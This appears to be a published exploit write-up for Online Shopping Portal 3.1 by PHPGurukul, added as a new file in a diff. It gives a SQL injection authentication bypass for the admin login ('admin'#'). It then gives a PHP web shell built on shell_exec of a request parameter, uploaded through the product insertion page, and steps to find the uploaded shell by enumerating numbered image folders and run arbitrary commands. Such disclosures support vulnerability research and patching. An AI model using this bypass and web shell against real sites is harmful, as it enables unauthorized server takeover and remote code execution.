@@ -1,0 +1,43 @@
+# Exploit Title: Online Shopping Portal 3.1 - Authentication Bypass
+# Date: 2020-06-25
+# Exploit Author: Ümit Yalçın
+# Vendor Homepage: https://phpgurukul.com/shopping-portal-free-download/
+# Version: 3.1
+# Tested on: Windows 10 / WampServer
+
+1- Authentication Bypass
+
+Go to following url!
+http://localhost/shopping/admin/
+
+Default admin username is admin, to bypass authentication use sql bypass like '# or ' OR 1=1#
+
+username = admin'#
+passwrod = what ever you want
+
+
+2- Uploading Shell to Remote Code Execution
+
+After bypassed the authentication go to insert-product field
+http://localhost/shopping/admin/insert-product.php
+
+
+after that, upload you shell , as an example
+
+<?php
+$exe = shell_exec($_REQUEST['cmd']);
+echo $exe;
+?>
+
+
+and go to http://localhost/shopping/admin/productimages/ and all possible folders named with number from 1 like 
+
+http://localhost/shopping/admin/productimages/1
+http://localhost/shopping/admin/productimages/2
+http://localhost/shopping/admin/productimages/3
+http://localhost/shopping/admin/productimages/4
+http://localhost/shopping/admin/productimages/5
+
+When you find your shell, for example you found at 21
+
+TARGET/shopping/admin/productimages/21/shell.php?cmd=CODE_YOU_WANT_TO_EXECUTE
